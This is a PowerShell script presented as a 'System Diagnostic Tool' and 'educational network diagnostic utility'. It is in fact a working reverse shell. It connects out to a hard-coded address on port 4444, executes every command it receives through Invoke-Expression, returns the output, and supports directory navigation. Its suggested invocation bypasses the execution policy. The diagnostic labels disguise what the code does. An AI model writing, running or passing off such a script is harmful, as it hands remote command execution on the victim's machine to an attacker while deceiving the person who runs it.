# Simple System Diagnostic - PowerShell Edition
# Run with: powershell -ExecutionPolicy Bypass -File .\SystemDiag.ps1

# Configuration
$ServerHost = "192.168.1.46"
$ServerPort = 4444

# Generate session ID
$SessionId = -join ((1..8) | ForEach {[char]((65..90) + (97..122) + (48..57) | Get-Random)})

Write-Host "=" * 60 -ForegroundColor Cyan
Write-Host "System Diagnostic Tool v3.0 - PowerShell Edition" -ForegroundColor Cyan
Write-Host "Session ID: $SessionId" -ForegroundColor Cyan
Write-Host "Educational network diagnostic utility" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Cyan

Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Initializing network diagnostic..." -ForegroundColor Green
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Target: $ServerHost`:$ServerPort" -ForegroundColor Green

try {
    # Create TCP connection
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ServerHost, $ServerPort)
    
    if ($client.Connected) {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connection established!" -ForegroundColor Green
        
        # Setup stream communication
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Send initial messages
        $writer.WriteLine("System Diagnostic Tool v3.0 - PowerShell Edition")
        $writer.WriteLine("Network connectivity test completed")
        $writer.WriteLine("Ready for diagnostic commands")
        $writer.WriteLine("")
        
        # Get current directory
        $currentDir = Get-Location
        $writer.WriteLine("Base directory: $currentDir")
        $writer.Write("$currentDir> ")
        
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Entering diagnostic command loop..." -ForegroundColor Green
        
        # Main command loop with persistent directory
        while ($client.Connected) {
            try {
                # Read command from remote host
                $command = $reader.ReadLine()
                
                if ($command -eq $null -or $command -eq "") {
                    break
                }
                
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Executing: $command" -ForegroundColor Yellow
                
                # Handle exit commands
                if ($command.ToLower() -in @("exit", "quit", "bye")) {
                    $writer.WriteLine("Diagnostic session terminated")
                    break
                }
                
                # Handle directory navigation
                if ($command.ToLower().StartsWith("cd ")) {
                    try {
                        $newDir = $command.Substring(3).Trim()
                        
                        if ($newDir -eq "..") {
                            $newPath = Split-Path $currentDir -Parent
                        }
                        elseif ([System.IO.Path]::IsPathRooted($newDir)) {
                            $newPath = $newDir
                        }
                        else {
                            $newPath = Join-Path $currentDir $newDir
                        }
                        
                        if (Test-Path $newPath -PathType Container) {
                            Set-Location $newPath
                            $currentDir = Get-Location
                            $output = "Directory changed to: $currentDir"
                        }
                        else {
                            $output = "Directory not found: $newPath"
                        }
                    }
                    catch {
                        $output = "Error changing directory: $($_.Exception.Message)"
                    }
                }
                # Handle pwd command
                elseif ($command.ToLower() -eq "pwd") {
                    $output = $currentDir.ToString()
                }
                # Execute other commands
                else {
                    try {
                        # Change to current directory
                        Set-Location $currentDir
                        
                        # Execute command and capture output
                        $result = Invoke-Expression $command 2>&1 | Out-String
                        
                        if ([string]::IsNullOrWhiteSpace($result)) {
                            $output = "[Command completed - no output]"
                        }
                        else {
                            $output = $result.Trim()
                        }
                    }
                    catch {
                        $output = "[Error: $($_.Exception.Message)]"
                    }
                }
                
                # Send output back
                $writer.WriteLine($output)
                $writer.Write("`r`n$currentDir> ")
                
            }
            catch {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Loop error: $($_.Exception.Message)" -ForegroundColor Red
                break
            }
        }
        
        # Cleanup
        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
        
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Diagnostic session completed" -ForegroundColor Green
    }
    else {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Failed to establish connection" -ForegroundColor Red
    }
}
catch {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error: $($_.Exception.Message)" -ForegroundColor Red
}
